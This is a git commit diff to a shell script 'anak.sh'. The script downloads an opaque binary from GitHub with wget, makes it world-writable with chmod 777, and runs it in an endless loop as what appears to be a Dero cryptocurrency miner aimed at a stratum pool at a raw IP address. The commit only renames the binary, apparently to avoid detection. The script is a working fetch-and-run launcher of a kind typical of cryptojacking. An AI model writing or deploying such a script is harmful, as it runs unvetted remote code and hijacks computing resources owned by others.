93c5ee11f5a9ce55a933922a73a89eefad2114df
renilo <88342640+renilo@users.noreply.github.com>
2022-10-31 21:41:46 +0700

    Update anak.sh

--- anak.sh
+++ anak.sh
@@ -1,8 +1,8 @@
-wget https://github.com/renilo/kuuntul/raw/main/mimin
-chmod 777 mimin
+wget https://github.com/renilo/kuuntul/raw/main/momon
+chmod 777 momon
 
 #!/bin/bash
 while :; do
-    ./mimin -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4.Rig -r 170.187.197.220:443 -p stratum;
+    ./momon -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4.Rig -r 170.187.197.220:443 -p stratum;
     sleep 5;
 done
